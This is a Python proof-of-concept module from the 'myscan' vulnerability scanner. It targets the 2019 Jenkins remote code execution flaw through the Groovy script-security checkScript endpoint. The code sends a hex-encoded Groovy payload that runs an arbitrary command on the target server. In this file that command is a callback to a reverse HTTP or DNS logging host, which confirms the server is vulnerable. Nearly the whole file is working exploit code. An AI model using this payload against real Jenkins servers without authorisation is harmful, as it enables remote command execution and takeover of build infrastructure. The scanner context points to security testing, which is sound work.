# !/usr/bin/env python3
# @Time    : 2020/11/20
# @Author  : caicai
# @File    : poc_jenkins_rce_2019.py


from myscan.config import scan_set
from myscan.lib.core.common_reverse import generate_reverse_payloads, query_reverse, generate
from myscan.lib.helper.request import request  # 修改了requests.request请求的库，建议使用此库，会在redis计数
from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.core.threads import mythread
from myscan.config import reverse_set
import binascii


class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        self.url = workdata.get("data")  # self.url为需要测试的url，值为目录url，会以/结尾,如https://www.baidu.com/home/ ,为目录
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "jenkins_rce"
        self.vulmsg = "referer: https://github.com/orangetw/awesome-jenkins-rce-2019"
        self.level = 2  # 0:Low  1:Medium 2:High
        self.success = False

    def verify(self):
        # 根据config.py 配置的深度，限定一下目录深度
        if self.url.count("/") > int(scan_set.get("max_dir", 2)) + 2:
            return

        reverse_urls, reverse_data = generate_reverse_payloads(self.name)
        _, dns_data = generate(self.name, "dns")

        tasks = []
        for reverse_url in reverse_urls:
            for cmd in [reverse_url, reverse_url.replace(reverse_set.get("reverse_http_ip", ""), dns_data)]:
                for path in ["", "securityRealm/user/admin/"]:
                    tasks.append((cmd, path))
        mythread(self.run, list(set(tasks)))

        sleep = True
        for hexdata in [reverse_data, dns_data]:
            query_res, _ = query_reverse(hexdata, sleep)
            sleep = False
            if query_res:
                parser_ = dictdata_parser(self.dictdata)
                self.result.append({
                    "name": self.name,
                    "url": self.url,
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "others:": "{} in dnslog".format(hexdata),
                        "request": parser_.getrequestraw(),
                        "response": parser_.getresponseraw()
                    }
                })
                break

    def run(self, data):
        cmd, path = data
        endpoint = 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'
        payload = 'public class x{public x(){new String("%s".decodeHex()).execute()}}' % binascii.b2a_hex(
            cmd.encode()).decode()
        params = {
            'sandbox': True,
            'value': payload
        }
        req = {
            "method": "GET",
            "url": self.url + path + endpoint,
            "params": params,
            "allow_redirects": False,
            "verify": False,
            "timeout": 10
        }
        r = request(**req)
